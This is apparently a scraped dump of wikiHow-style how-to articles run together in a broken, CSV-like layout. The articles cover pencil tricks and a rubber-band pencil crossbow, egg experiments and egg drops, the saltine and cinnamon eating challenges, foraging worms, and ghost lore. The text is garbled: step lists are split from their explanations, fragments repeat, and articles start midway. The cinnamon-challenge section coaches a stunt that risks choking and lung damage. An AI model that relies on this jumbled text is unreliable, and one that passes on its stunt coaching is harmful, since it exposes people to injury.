Hold the pencil with you index finger and thumb directly in the middle of the pencil. Feel the weight and make adjustments to your hold until the pencil feels balanced., You can imitate bass tones from a drum kit by using the eraser side of a pencil. The eraser side of the pencil produces a muted tone similar to a tom or a bass drum. Increase the bass tones of the pencil by playing on a hollow surface like an empty bottle.

, The point side of a pencil is better to be used for the higher pitched tones on the drum kit. Sharpen your pencil to increase the amount of treble in the sound. You can increase the treble sound by playing on a hard surface like a desk something metal.


The tip will probably break off if you make hard hits for the beat.

, Practice alternating sides of the pencil from the balanced position between your index finger and thumb. Try to make a simple beat by counting 1-2-3-4. Play the treble side for 1-2-3 and then play the bass on the 4. Start slowly and work your way towards a unified beat.


Play along to your favorite songs to get a better feeling for holding the pencil this way.
You could also play along to a metronome to help your timing.

Stab the flat end of the pencil (or end with eraser) into a school glue stick, about 1–2 centimeter (0.4–0.8 in) in (up to three quarters of an inch);
,
Take it out and see if there is a ""glob"" of glue on the end.,
Move the glue onto the end of the pencil, make sure it is on tight and won't come off too easily.

,
Holding the sharpened end with the glue downwards, (preferably just below the height of a desk) check for a teacher, the best time to do this is when a teacher has left the room.

Fling the pencil up.,
Look for it moving on the ceiling.,
Another simpler version to complete this task is to sharpen your pencil, and flick it at the ceiling so that it goes in like an arrow.",How to Stick a Pencil to the Ceiling,", If there isn't, put it back in, and take it out on an angle to get some glue.

,,, Just a quick flick will do.

, If it is moving, it may come back down.

Fasten the lathe to the stock.,
Construct a shaft for your crossbow.,
Affix the shaft to the crossbow.,
Add the strings.,
Attach the strings to make a seat.,
Shoot an arrow.",How to Make a Crossbow Using Pencils," The stock is the base, the part of the crossbow upon which everything rests. To make it, take two pencils. Line them up so that the erasers are together. Tie a rubber band about an inch from the erasers, and tie a second rubber band about an inch from the tips.








Use unsharpened, unused pencils that are the exactly the same length. This will make your crossbow more stable.
Make sure the rubber bands are fastened tightly. You don't want the pencils to get loose or roll over on each other.;
, The lathe is the part of the crossbow to which the strings are attached. To make it, repeat the process above with two more pencils to make a piece identical to the stock. Line up two pencils and rubber band them in the same two places. Make sure your lathe is secure.








, Here is where you form the ""cross"" in your crossbow. Lay your stock vertically on the table so that the erasers are facing you and the ends are pointing away. Cross the lathe over the stock so that the middle of the lathe is placed directly over the top rubber band on your stock. The result should look like a lower-case ""t."" Secure the lathe and stock by winding a rubber band where the pieces join. Wind it around both pieces until the crossbow base is secure.









The crossbow should be constructed so that both the stock and the lathe lie flat when you set the crossbow on a table. If one piece sticks out at an angle, adjust the rubber band that's holding them together until the crossbow will lie flat.














, Take the ball point pen and remove the tip, the inkwell and the base so that you're left with just the hollow plastic case. This will be the shaft that holds your arrow so you can shoot it straight and true.








, Line up the pen shaft with the stock. The tip of the shaft should rest right at the rubber banded place where the stock and the lathe cross each other. The other tip of the shaft should rest near the bottom rubber band of the stock. Use a few pieces of tape to fasten the shaft to the stock in two places, so that it stays securely in place.









Wind the tape around the shaft and stock piece a few times to make sure it never comes loose.

, The strings are the rubber bands that launch your arrow when you shoot. First, lay your crossbow on the table so that the erasers at the end of the stock are facing you. Now look at the lathe and find the rubber band on the righthand side. Take one of your ""strings"" - a new rubber band - and loop it between the two pencils that form the lathe. Loop it so that string rests between the two pencils and is nestled up against the rubber band holding them together. Do the same thing on the left side: add a string between the pencils and scoot it up so that it's right next to the lefthand rubber band.








, This little seat is where the end of your arrow will rest, the point from which it will be launched at your target. Place the strings next to each other near the erasers at the end of the stock. Take one piece of tape and wind it through each loop and around, so that you attach the tips of the two strings together. Now take a second piece of tape and cross it over the first piece. You should have a little flat, secure spot, a ""seat,"" that you'll use to cradle the arrow.








, Get a pencil, a long, thin piece of wood, or any other instrument long enough to fit inside the shaft on your crossbow. This is your arrow. Slide the arrow into the shaft and cradle its base in the seat. Support the stock with one hand and aim your crossbow at your target. Use your other hand to pull back the strings, and the arrow with them. Release the strings to shoot.









If anything wobbled or seemed loose when you used your crossbow, use tape to stabilize it.
Experiment with different arrows and figure out how you might want to improve your crossbow. For example,


Switch out the strings for bigger, stronger rubber bands.

Construct a better seat out of piece of fabric.

Use wood scraps and wood glue to build a bigger stock and lathe.

Hold the pencil in pre-flip position.,
Stiffen your ring finger, shooting it backwards.,
Get your pointer finger and thumb out of the way.,
Bring your middle finger forward once the pencil has started its flip.,
Catch it with your thumb.,
Keep spinning or end the trick.,
Start out slow.,
Experiment with different pens and pencils.,
Go for the double spin.,
Try different spins.",How to Spin a Pencil Around Your Middle Finger," Place the tip on your pointer finger, the midsection resting on the tip of your middle finger, your thumb on top between those two fingers, and the fingernail of your ring finger touching the inside of the pencil. Got it? Cool.


The pencil will feel as if it's dangling by the tips of your fingers, and this is necessary to do the flip. Your hand should be relaxed and loose at this point, too. It'll feel a little precarious, but that's how the pencil's going to get around and around.;
, Part of the initial thrust will be from your ring finger as it straightens out, sending the pen around your middle finger. You may find that your pinky finger immediately follows suit, too. Don't mind the pinky – it tends to do its own thing.









This is only part of the entire picture. You can practice this movement, but it won't be perfect until you line up the rest of your fingers and put them to work, too.

, Let's cover them each separately:









The pencil was resting on the pad of your pointer finger. As you go to thrust it around your middle finger, simple extend it outward, taking it off the pencil. You'll need it for the landing, but for the initial thrust, just get it out of the way.
Your thumb, on the other hand, should slide down the pencil toward the tip. When it lifts up, this is the release of the tip of the pencil, with your ring finger propelling the base. These two movements are what gets it around your middle finger. Just like your pointer finger, the thumb comes off for the initial flip around and then will be there to catch it in motion.

, Once the thumb releases the tip and the ring finger propels the pencil back, bring your middle finger toward you, bending it ever-so-slightly forward. This allows your pointer finger and thumb to catch it as it comes around.









This is a very small movement. If you move it too much, the pen will just go flying – and your teacher won't be thrilled with you.

, As the pencil rotates around your middle finger and comes around full circle, stop it with your thumb. As the thumb stops it, bring up your pointer finger to catch it from the bottom. And there you have it – that's one entire spin for the record books.








, When you catch the pen as it comes around, return your fingers to the pre-flip position. Then, it's practice, practice, practice.









When the pencil spins all the way around the middle finger, it should land right in the skin between index finger and thumb. At the same time it lands, grip the pencil with any finger and any part of your thumb. The pencil should be able to land in the writing position or something similar to it. This is a good transition to end the trick.

, As you're learning to do this, start out as if you're doing it in slow motion. Guide the pencil around your middle finger as much as you have to – it'll help you see the basics of it. Then, as you get better and better, start speeding up. It just takes practice and time.









You'll notice that when you go slow, you'll have to use your pointer finger to prop it up and get it to your thumb. This is the main difference between going slow and going fast. When you go fast, the pencil has enough power to not need your pointer finger to keep it going.
Once you get the hang of it, try doing it without holding the pencil against the thumb flap. This helps for performing the ""Harmonic"" and linking this trick into combos; it disrupts the flow if you must adjust the pencil against your thumb every time you need to perform this trick.

, Sometimes a certain weight or length of pen or pencil just doesn't mesh with your spinning style. If the one you're working with currently is difficult to do, try a different one. You may be surprised that it had more to do with your tool and less to do with you.









Pencils are long and spindly and that can make it difficult for spinning. Imagine if your arms were seven feet long and you had to spin around something, you know? You may want to switch to a pen that's shorter and a little beefier – it may give you something to grab a hold of.

, Once you have the hang of this, try starting the pencil in between your pinky and ring finger. Using the same steps, spin the pencil around your ring finger and catch it between your middle and ring fingers. You will now be set up to spin it around your middle finger – the double spin will give it a cool effect. You can even spin your pencil from the pinky/ring finger to the middle/pointer finger!









Learning how to perform this trick backwards (from index/middle slot to the middle/ring slot) is a good idea too, because you can then perform this trick back-and forth continuously. This is then called the ""Middle Around Harmonic.""

, This spin in particular is good for class. Since it's stopped by your thumb, you don't run the risk of the pen spiraling out of control and landing in your class fish tank. That being said, this may not be the spin for you. Have you ever tried spinning a pencil around your thumb? How about spinning a pencil backwards around your thumb? There's quite a few ways to do it.

Fill a tall glass with water.,
Stir in plenty of salt.,
Drop in an egg.,
Slowly pour tap water on top.,
Learn about the chemistry.,
Try adding more salt.",How to Make an Egg Float1," Leave some space at the top, but don't drop the egg in yet. Since an egg is denser than plain water, it would just sink.



Density describes how much ""stuff"" (mass) is pressed into a space (volume). If you pick up two objects the same size, the one that feels heavier is denser.;
, Stir about 6 tablespoons (90 milliliters) of salt into the glass of water. Keep stirring until almost all the salt dissolves. (You should see almost no salt crystals at the bottom of the glass.)


When salt dissolves in water, it ""sticks"" to the water molecules, fitting between them and even pulling them closer together. This means the mass increases, but the volume stays about the same.

, The saltwater you made is denser than the glass of plain water was. If you added enough salt, the water is now denser than the egg. Test this by gently dropping the egg into the glass of water. If the water is denser, the egg will float.


If the egg doesn't float, add more salt. Make sure to stir until the salt is dissolved.

, If you pour the tap water in gently, it will sit on top of the saltwater without mixing together. The egg is lighter than the saltwater but denser than the tap water, so it will float in the middle of the glass!, Here's a more complete explanation: when table salt (chemical formula NaCl) dissolves in water, it breaks apart into two atoms: sodium (Na+) and chlorine (Cl-). The + and - symbols tell you that these atoms are ""ions,"" meaning they have an electric charge. Since the opposite ends of a water molecule also have electric charges, the ions attract the water molecules closer and form a tight connection., If adding more salt makes the mixture denser, can you keep going? Could you add so much salt that a hammer could float on the water? Think about it (or test it), then click here to see the answer.

Test eggs as they age.,
Float boiled eggs.,
Find the minimum amount of salt to float an egg.",How to Make an Egg Float2," Is a fresh egg denser than an old egg, or is it the other way around? Line up several glasses of water with different amounts of salt stirred in, from plain water to heavy salt water. Drop a fresh, raw egg into a glass, then move it left or right until you find the least salty water the egg can float in. Repeat this each day, using a new egg from the same carton. As the eggs get older, do they float in more glasses, or sink? Read about what happened once you've tested it.


If you can, get your eggs directly from a farmer. Supermarket eggs are often a couple weeks old when you buy them, so it will be harder to notice the difference., Do you think boiling an egg would change its density? Set up the same experiment – a row of water with different amounts of salt – but this time, compare fresh eggs with boiled eggs. Is there a difference? Read about the results.

, Can you think of a way to make a glass of salt water with the same density as the egg? Here's one approach:Stir ⅓ cup (80 mL) salt into 1⅔ cups (400 mL) water until it all dissolves. This is a ""stock solution"" you will use to make other salt water mixes.
Fill glass number 1 with ¾ cup (180 mL) of the stock solution.
Fill glasses 2 through 5 with ¾ cup plain water each.
Mix ¾ cup stock solution into glass number 2. This is now half as salty as glass 1.
Take ¾ cup from glass 2 and mix it into glass 3. Glass 3 is now half as salty as glass 2.
Mix in ¾ cup from glass 3 into glass 4. Leave glass 5 as plain water.
Try to float an egg in each glass. If you got close to the density of the egg, it will float in the middle of the glass, stand on the base, or bob just below the surface.

Should it have a theme? Design to these requirements.;
, What do you think will help to protect an egg? What is happening when a falling egg breaks, and how can you prevent this? If it helps, draw pictures of your ideas as you go, or write down descriptions. Here are some suggestions to get you started, but try to think of ideas of your own, too.


A hard shell. This might be a coffee can, a milk carton, or a shoe box. Think in terms of things you can easily obtain.
Padding. Cotton balls, tissue, bubble wrap, marshmallows, foam, fabric, and popcorn are all possibilities.
A way to restrain the egg. It does no good if the egg keeps moving and breaks against the side of the container. Use the padding itself, or try tape, rubber bands, a sling made from old pantyhose, or your own idea.
A way to slow the falling egg. Some contests allow parachutes and similar mechanisms. Others do not. Remember that a parachute might decrease the accuracy with which your egg enclosure will hit a target, so read the rules before you choose a parachute design.
Containment. Tape, string, glue, a buckle. Do you need to be able to open and close the container? You don't want your egg falling out.

, Which one do you think will do the best job? Choose the idea or combination you think will work best.

, Will it work according to your plans? You can change your idea if building it turns out to be too difficult.

, Don't wait until the contest to try out your design. You could learn a lot by breaking an egg or two in advance of the contest.

,, Try a high window, the bleachers at your school, or ask your parents to drop it from a ladder. If you know how high the drop will be in the contest, try to drop yours from a similar height.


If you can't get high up enough, get as high up as you can and throw the egg assembly in the air.

, If the egg did not break, congratulate yourself! Test a few times, just to be sure. If the egg broke, improve your design and test it again.

Wait for the water to start boiling, then turn off the heat. Let the egg sit in the water for 10 to 20 minutes. Then remove the egg and set it on a paper towel. Do not remove the shell from the egg.









Make sure there's at least an inch of water above the egg when it's in the pot.;
, Find a jar or Tupperware container large enough to fit the egg. Grab a bottle of regular white vinegar and fill the jar or Tupperware container with vinegar. Don't fill it all the way to the brim though, because then putting the egg in will make it overflow.








It doesn't have to be filled to the top but it should be filled high enough so that the egg can be completely submerged in vinegar.

, You can easily make your finished bouncy egg any color you want to by adding food coloring dye to the vinegar. Just add around 10 drops of the dye to the vinegar, or enough to color the whole container of vinegar., Place the hard boiled egg in the vinegar-filled container. Just drop it in from right above the vinegar so the vinegar doesn't splash everywhere. Make sure it is completely submerged.








Make sure the egg is cool before submerging it in vinegar.

, Place a lid on your container and leave it somewhere safe but out of the sun. The less sunlight it gets the better, so either put it somewhere dark like a closet, or cover it with something like a kitchen cloth.








, This process can take anywhere from 24 to 72 hours. To be on the safe side, wait three days before continuing.








The reason shell dissolves is because vinegar is a weak acid. The egg shell is made of calcium carbonate. When the shell meets vinegar, it makes a chemical reaction that turns the calcium carbonate into carbon dioxide, which is what those bubbles in the container are.

, Now that the shell has been dissolved by the vinegar, you can remove the egg from the container. Just reach in and pull the egg out. Don't forget to wash you hands after.







, Handle the egg with care and gently remove any excess skin.








, Fill a large container with cold water and use your hands to thoroughly rinse the egg off. You just want to make sure you get all the leftover bits of skin and tiny remains of the shell off the egg.








Alternatively, you can rinse the egg by holding it under running water in the sink.

, Wait for the egg to dry, or dry it off with a paper towel, and then bounce it on the counter!

Have water nearby.,
Try the 3,2,1 strategy.,
Try pairing the crackers for consumption.,
Try eating all 6 crackers at once!,
Practice before the challenge.,
Keep your cool.,
Go for it!",How to Eat Six Saltine Crackers in One Minute," Watch videos of people successfully eating 6 saltines in under a minute. Know that the challenge can be defeated before you begin. Watching videos can also give you ideas for strategies to try.


Imagine yourself accomplishing the task and remind yourself daily that you can do it.;
, You'll want to have your crackers laid out in the order you want to eat them and make sure they are easy to grab. It's easier if you place the entire cracker in your mouth and chew so be prepared to pick each cracker up with your thumb and index finger in order to place it wholly in your mouth.

, You will need to keep hydrated so make sure to drink water right before the challenge and the crackers will have an easier time going down.


It helps to drink a glass of water before the challenge so your mouth and throat are hydrated.
If you want to get your mouth watering naturally just think about sour candy, or anything else that may jump-start your saliva.

, There are several strategies called chunking strategies that could give you better results. This strategy is done by eating your crackers in sets of three, then two, and eating the last cracker on it's own.


Your saliva is absorbed after eating two saltines separately, so when you use this strategy it is said to be easier since half of the challenge is over with in the first go.
The next two crackers can be managed, knowing you're almost finished, and the last cracker isn't as daunting since there is only one.
There is always a choking hazard with food competitions and this one isn't any different.
When stacking the crackers, gently place them wholly in your mouth and crush them between the roof of your mouth and your tongue.
It's helpful to first gum the crackers to make sure they're covered in saliva so when you open your mouth the chew there aren't stray crumbs which can fly into your throat and cause you to choke or cough.

, So eating 2, 2, and 2. You can set the pairs up in three stacks for a more efficient way to pick them up.


This strategy may work for people who can't fit three crackers in their mouth at once but still want to get it over with faster than one by one.
Again, the advantage here is that you can crush more crackers at a time with the same amount of saliva.
There is less of a choking hazard by placing only two crackers each time, but the gumming technique still applies.
This strategy may feel less effective than the 3,2,1 strategy when you have the last two crackers staring you down and your mouth is already dried up from the first two sets.

, You'll want to stack the crackers first, then take your time figuring out how you will pick them up so none slip out. Finally, you can work on getting them in your mouth gently and efficiently.


You'll have a minute to chew and swallow but the foundation to completing the challenge in time is finding a way to place them in your mouth that works best for you.
Avoid breathing with your mouth. You're not really safe from the cracker crumbs until you can close your mouth around the crackers and gum away so breathing through your nose is a better option.
This strategy can be skipped when practicing if you feel like the others will suite you better.
This should only be done with water on hand in case things don't go so well and all those crumbs dry you out and leave you coughing up your crackers.

, Have your timer ready and try out what strategy you think will work best for you. It's helpful to try these out on your own to make sure you can master it before making bets and doing the challenge in public.


Watch more videos of people completing the challenge.
How much time is given to chewing/gumming?
How long is it taking others to finish two crackers at a time? One? Three? All six?
Take notes on what techniques you believe are most effective.

, If you get over-excited or nervous you may breathe in the crumbs in your rush to stuff the crackers in your mouth and you won't be able to finish in time. Also, avoid shoving the crackers in your mouth as you could jab the back of your throat or poke your gums with the edges of the crackers. Try to relax and believe you can do it.

, You've done the prep work and are ready now. Tell your friends you can do it, take a deep breath, set your timer and defy the Saltine Challenge!

, This process can take anywhere from 24 to 72 hours. To be on the safe side, wait three days before continuing.







, Look at the egg through the container every once and a while to check its progress. The egg will turn a transparent color because the eggshell is increasing in thickness. The eggshell will soon dissolve, leaving just a thick strong egg white.








The reason shell dissolves is because vinegar is a weak acid. The egg shell is made of calcium carbonate. When the shell meets vinegar, it makes a chemical reaction that turns the calcium carbonate into carbon dioxide, which is what those bubbles in the container are.

, Take the egg out of the vinegar carefully. Just reach in and pull it out with your hand. Don't forget to wash your hand afterwards. Place the egg on a couple of paper towels to let it drain.Be extra careful when handling a raw bouncy egg. It will be more fragile than a boiled bouncy egg.

, Make sure it's dry first. You can speed this up by drying it by hand with a paper towel. Be careful not to drop it from too high of a height, as it can still break and leave a mess. Start with just a few inches, and have cleaning supplies ready!

Let the egg float.,
Create a cradle.,

Make a parachute.,
Catch the egg in a net.,
Choose a grassy location.",How to Drop an Egg Without It Breaking," Surrounding the egg with cereal can be a surprisingly effective way of distributing the force of the impact. For best results, choose a ""puff"" type cereal over something with flakes. These puffs contain a decent amount of air and make better cushions.Wrap the egg around with wet paper towels.
Place the egg in one plastic bag and surround it with a puffed rice cereal.
Fill four other small bags with the same cereal but do not put any eggs inside.
Place all the bags inside of a larger resealable bag. Make sure that the bag with the egg in it is in the middle and all the other bags are packed around it from all sides.;
, Packing material is designed for the specific purpose of protecting fragile items from bumps and blows. If you have enough of it, this material can also protect a raw egg from breaking after a nasty tumble. The simplest way to approach this is to get heavy-duty bubble wrap. Carefully wind the bubble wrap around the egg anywhere from two to five times, creating a thick cushion. Tie the ends of the bubble wrap with rubber bands to prevent the egg from slipping out through the top or bottom.
If you do not have bubble wrap but do have other packing materials, like packing peanuts, inflated plastic packing packets, packing paper, cotton balls, or crumpled newspaper, you can use these materials to cushion the egg, as well. Spread a thick layer of your chosen packing material inside a box that is at least four to eight times larger than the egg. You should use enough material to fill the box halfway. Place the egg in the center of this cushion, then gently cover it with enough packing material to fill the rest of the box. Close the box and seal it with tape before the drop.

, These airy, soft foods can be used like cereal or packing materials. The basic idea is to surround the egg with enough of a cushion using these foods to reduce the force of the impact the egg faces once it lands.


The exact container you use does not necessarily make a difference, but there are a few things you should keep in mind. Make sure that the container is large enough so that you can cushion the egg around all sides, just in case the egg lands on its side instead of on the top or bottom of the container. You also need to make sure that you have enough marshmallows, popcorn, or similar soft food to fill the container completely. If not, the egg might move around inside.
Marshmallows and popcorn both work so well because they contain so much air. You could try other types of food, as well, but the food you choose should either be very soft or very airy.
Fill the container halfway with marshmallows. Place the egg in the center of your marshmallow nest, then carefully fill the rest of the container with marshmallows, as well. Make sure that the entire container is filled but do not press down on the egg as you pack the container.

, If you can keep the egg floating in water during the drop and upon impact, the force of the impact should distribute itself evenly throughout the water and have very little effect on the egg itself.


Place the egg inside of a tin can, plastic box, or other durable container. This container should be about five times as large as the egg.
Fill the rest of the container with water and add a handful of salt. The egg will float better in salt water than in normal water. Make sure that the entire container is filled with water and that it is well sealed before you drop it.

, Suspend the egg in the center of a box or similar container using a pair of nylon stockings or panty hose. Stockings are very elastic and soft. As the container holding the egg strikes to ground, the stockings should give slightly, allowing the egg to come to a stop without that stop being quite so sudden. As a result, the force on the shell is lessened, making it less likely to crack.


Cut off one leg of the stockings. Place the egg inside this leg at the center of stocking. Tie the egg in place using rubber bands.
Tightly pull the stocking leg diagonally through a box, extending it from one upper corner to one bottom corner. The egg should be positioned in the center of the box. Staple or otherwise hold the stocking in place.
Note that your box can be made of nearly any material. It could be a cardboard or plastic box, or you could even construct a box frame out of metal clothes hangers.

, You can place the egg at the top of a cushioned container instead of placing it in the center as long as you have a heavy enough weight to control the direction the container falls in. The easiest way to do this is to use a stone and styrofoam cups.


Place one heavy rock in the bottom of one styrofoam cup. The rock must be heavier than egg.
Place six more styrofoam cups inside the bottom cup, on top of the rock.
Place the egg inside the top cup.
Fit one more cup gently on top of the egg to secure the egg's position.
Tape the cups together along the sides so that the container will not fall apart during the fall.
If the rock is heavy enough, the container should fall rock-side down and egg-side up. The styrofoam cups should also help cushion the blow.

, If you can design a parachute for the container holding your egg, you can reduce the velocity at which the egg drops. Since the egg is falling at a slower speed, the force of the impact will be much less once it hits the ground. Less force means that your egg might have a chance at survival.There are a few different parachutes you can try, but one of the easiest materials to use is a plastic shopping bag. Place the egg in a box, along with any cushioning you may choose to use. Attach a large plastic grocery bag to the top of the box using tape or a stapler. Make sure that the handles are near the sides of the box so that enough air can get inside the bag as the box drops.
When you drop the box, make sure that the side you attach the parachute to is at the top. This will allow air to fill the bag and cause it to open up, reducing the speed of the descent as a result.

, An egg shatters when dropped on the ground because massive deceleration within a small distance creates a significant amount of force. Catching the egg in a net of sorts can increase the deceleration time and reduce the overall force.


If you cannot use an actual safety net, a simple alternative is to use a linen sheet. Stake the sheet at least 1 foot (30.5 cm) above the ground. When you drop the egg, make sure that it lands as close to the center of the sheet as possible.
Similarly, you could also give the egg a cushion to fall into instead of a net. The principle at work here is the same. Fill a large, wide box with a thick layer of heavy-duty bubble wrap or similar packing materials. When you drop the egg, make sure that it lands on the cushion.

, If you can choose the landing site, opt for a grassy location instead of a concrete sidewalk or parking lot. Grass and soil are naturally softer than concrete or stone, so the force of the impact will automatically be much smaller.

For even better results, drop the egg after a good rainstorm so that the ground is very soft. Try to avoid dropping the egg during a drought, since soil tends to be much harder and more firmly packed in these conditions.

Napkins/paper towel
Stopwatch
Trash can/bucket
Water;
, You'll want to perform this challenge in a place where you can easily clean a mess up. Spilled cinnamon, cinnamon vomit, and cinnamon that has mixed with your saliva to form a paste can stain carpet or discolor fabric.


You may also want to change into clothing that you don't mind getting dirty and potentially staining.

, The key to succeeding in the cinnamon challenge is having enough saliva, or fast enough working saliva glands, to get the cinnamon down. Without enough saliva to moisten the powder, it's likely you may choke, cough, or gag.Making sure you're well hydrated and drinking some water before hand might help your results.

, A cell phone with video recording capacity is more than suitable, though a video camera with a stand might work best if you're filming yourself. Take a moment to check not only that your camera works, but also that it can record in segments longer than 60 seconds. You wouldn't want to miss full coverage of your cinnamon challenge victory!


Your hands will be full with your spoon and your stopwatch, so if you're planning on using a cell phone to record your attempt at the cinnamon challenge, you might want to consider enlisting a friend to catch it all on video.

, Pour or scoop the cinnamon from the container onto your spoon. You don't need a heaping helping; a tablespoon is enough to fulfill the requirements of the challenge.


Prepare your stopwatch as well. You should be able to hold your spoon in your dominant hand and your stopwatch in your non-dominant hand.

, As soon as you put the cinnamon into your mouth, it will begin absorbing your saliva, drying out your mouth. This will be very uncomfortable, and your natural reflex will be to breathe in through your mouth. Do not breathe in.


You will feel small clumps of cinnamon that have absorbed your saliva and congealed into a paste. Try to maneuver these clumps with your tongue, swallowing a little at a time.
The moment you dump the cinnamon into your mouth, you should start your stopwatch.

, Keep in mind that inhaling through your mouth at this time will probably cause you to choke and inhale trace amounts of cinnamon. At this point, you will need to be patient, allowing your saliva glands time to produce more saliva to turn the powder into swallowable clumps.


Breathing through your nose is recommended until you have finished the challenge.

, Now that the cinnamon has sucked most of the moisture out of your mouth and you've battled it down your esophagus like a champion, you could probably use a glass of water. Take the water you prepared beforehand and drink from it deeply.

, Depending on the social media you're subscribed to, you may have many different venues to upload your cinnamon challenge video. Popular media outlets include: Facebook, Twitter, and YouTube.

, Coughing may be enough, a few sharp blows to the back between the shoulder blades can help, but with the thickness of the cinnamon paste, you may have to resort to sticking your fingers in your mouth to clear cinnamon goop from clogging your throat and mouth.Your main concern is getting the cinnamon out of your mouth and throat to help relieve the reaction it is causing.

, If you accidentally breathed some cinnamon in, your lungs will likely be irritated, resulting in lung inflammation, lung spasms, and coughing.Be sure that your coughing fit has ceased before drinking water so you don't accidentally inhale some water.

, Cinnamon has been referred to as a caustic powder, so chances are good you will feel some slight discomfort whether you've succeeded spectacularly or failed horribly.Even so, prolonged and severe burning, discoloration of the skin, difficulty breathing, intense wheezing, or any other irregular negative side effect should be addressed by a medical expert as soon as possible.

, In the event that there has been an allergic reaction, a severe asthma attack, or a collapsed lung, you should go to the nearest emergency room. Any immediate and severely negative physical response may be an indication something serious is wrong.


A collapsed lung can be identified by: shortness of breath and sudden, extreme chest pain."

Harvest worms out of your backyard with a small shovel and some time.,

Sort through outdoor compost to get at some worms.,
Know the basic soil history of your dig sites, avoiding pesticide or waste areas.",How to Eat Worms3," Head out with a small shovel, and work in small, 6-inch holes. Dig in short, shallow strokes. Worms love loose soil, not hard packed earth. Some good places to look include:


Damp, dark places.
Under rocks or logs
Loose, wet soil.
After rain storms.

, Mustard powder is an irritant to a worm's skin, so it will drive them up to the air. Furthermore, worms can drown if stuck in the soil when it is wet (this is why you see so much more worms after rainstorms). Sprinkle some mustard powder on loose earth, then ""water it"" to slowly and evenly to pull worms up to the surface., Note, however, that worms are an essential part of the compost pile's life cycle. They are the ones actually doing the composting! That said, the food in a good compost pile is irresistible to a worm, and if you live in an area with worms they will get back in., Worms eat the soil, meaning they'll pick up chemicals and waste if it is nearby. Never forage for food in areas that might be covered in pesticides or worse."

In most cases it is just a speck of dust or even an insect, so don't get too excited about orbs unless you can be 100% sure there is something very strange about it. Most credible ghost hunting groups discount orbs due to the very high risk of them being easily explained.
Human Forms - If you're lucky, you may capture an apparition; these are actual bodies or body parts of ghosts. It takes a lot of energy for a ghost to appear like that.
Thick Mist - Very thick mist-like shapes or streaks, often in very specific areas. Usually it's very obviously not normal mist.
Lights - Be sure you know where your light sources are (street lights, houses, etc) and that you can discount someone creating it. This a controversial capture as many can be explained.

Live a full and enthusiastic life.,
Learn to differentiate the states of living consciousness.,
Learn what to anticipate at the moment of death.,
Develop your “subtle body.” According to the Spiritual Science Research Foundation (SSRF), the consciousness left after a physical body dies is referred to as the “subtle body,” which is made up of the stuff that cannot be connected to your physical self.,
Leave unfinished business.",How to Become a Ghost1," Ghosts and ghost stories seem to have one thing in common: the people who become ghosts made a big impression on the world before they died. With your time on earth, it's important to live a big life. Have big appetites and desires. Get your heart broken and heal it. Make mistakes and get over it. Make sure the world will remember your name.


No one knows for sure how to become a ghost, and the very existence of ghosts cannot be verified conclusively. You might have your own powerful experiences with the paranormal, but try to be realistic about your goals. Becoming a ghost has nothing to do with dying under tragic circumstances or doing something terrible.
If you're struggling with thoughts of suicide, seek help immediately. Dying early isn't a fast-track to becoming a ghost.;
, According to the Bardo Thodol, or the Tibetan Book of the Dead, consciousness is split into six categories, three of which are experienced at the moment of death. The way that a person negotiates these states of consciousness relates specifically to what will happen to their essence following death. How a person transforms into a ghost, then, is affected by their negotiation of consciousness while alive, and while dying.


The living states of consciousness are life, or ordinary waking consciousness, the consciousness of meditation, and the consciousness of dream-sleep. To experience the full range of life and better understand the transition into death, be fully present in the different states of living consciousness.
Make a practice of keeping a dream diary to help explore your dreams and better understand your different states of conscious and unconscious life. Practice meditation on a regular basis.

, In the Book of the Dead, the dead experience a long journey, during which an elaborate ceremony is performed to ease the transition. The dying states of consciousness are “the clear light of reality,” “the experience of reality,” which features an intense series of hallucinations, and “rebirth,” in which the soul transmigrates to another form. Some people think that during this transition, some people become lost, and end up as ghosts.


The Clear Light of Ultimate Reality is the first stage, occurring at the moment of death, in which the dying person is said to experience bright light and god-consciousness.
The Second Bardo is more complicated. It lasts for up to two weeks, and according to some, souls that become “lost” at this second dying state of consciousness are the souls that become ghosts.In the third bardo, the soul will be reborn into a new vessel, or ascend into the afterlife. If a person is to become a ghost, it must happen before the third bardo.

, This is the part of some people that sticks around and becomes a specter or ghost. Whatever you believe about the afterlife, it’s a good idea to develop your subtle body in positive (or negative) ways, if you want to stick around. The subtle body consists of:


Ego. The bigger your ego, the more you desire power and recognition, the more tainted and present your subtle body will be. If you want to ascend into the afterlife, be ego-free. If you want to stick around as a ghost, be ego-mad.
Desire and anger are also powerfully connected to the subtle body. People who have difficulty controlling their tempers and difficulty controlling their desires are often said to become ghosts.
Fear can be a powerful component of the subtle body, as well. Mortal terror, the fear of death, is often said to be connected to transitioning the consciousness energy into ghostdom.

, For many paranormal enthusiasts, ghosts are thought to remain in the mortal sphere because they have some task, or unfinished business that they seek to finish before finally being laid to rest. How much of this is actually true and how much of this is good for ghost stories is difficult to verify, but it's a common theory regarding ghosts.Consider moving around a lot. Uproot yourself frequently, and leave hanging threads of your life scattered about. Make it so that lots of people remember you, and seek closure of some kind.

Learn about the paranormal.,
Try your best not to become paranoid!,
Avoid locations that carry great psychological or emotional tension.,
Be in good company.,
Remember that the more people there are in a group, the less likely it is for manifestations to occur--and even if they do, the less likely you are to notice them.,
Forget everything Hollywood taught you about ghosts.,
Carry a symbol of your religion around with you if you are a religious person.,
Know the proper way to address a ghost if you ever see or hear one.,
Be skeptical and logical.",How to Avoid Encounters With Ghosts and the Paranormal," If you're easily spooked, you might want to do this during the day, in the company of a friend or relative who's calmer than you. Avoid websites with scary pictures or background music, because those might make you nervous as well. Instead, browse around for sites explaining in loose terms what types of environment are likely to hold paranormal activity of any kind, or which sorts of people and situations often summon paranormal manifestations. Remember, the more you know about it, the better prepared you are.;
, Very few people can claim to have truly witnessed a paranormal manifestation. There is usually a reasonable explanation for something that looks like a ghost. This is why it is also useful to learn more about it: the more you know about something, the less scared you'll be.

, Most experts agree ghosts come back because they have unfinished business, and will haunt the places where they lived and/or died. Old hospitals and sanatoriums, abandoned sites, underground tunnels and prisons, medieval castles and closed-down inns or hotels are usually the scenes for ghost stories because these are often places that may be haunted in real life; they carry great emotional tension, and someone who died there would likely return there.

, Your best friend here is the one who can remain calm during a crisis, and who is able to soothe you even when he is feeling scared too. Find someone you trust, talk to them about your anxiety, and if you must go to somewhere you think may hold something paranormal, ask them to tag along. You should figure in which way you are best calmed down. It might be that you want a friend who goes along and jokes all the way to lighten your mood, or that you need someone who just holds your hand and carries a flashlight.

, Most ghost sightings occur when people are in pairs or alone.

, All experts on the subject agree no supposed ghost or paranormal manifestation was ever directly responsible for harm on a human being. Movies (especially thrillers) tend to exaggerate to bring up a reaction.

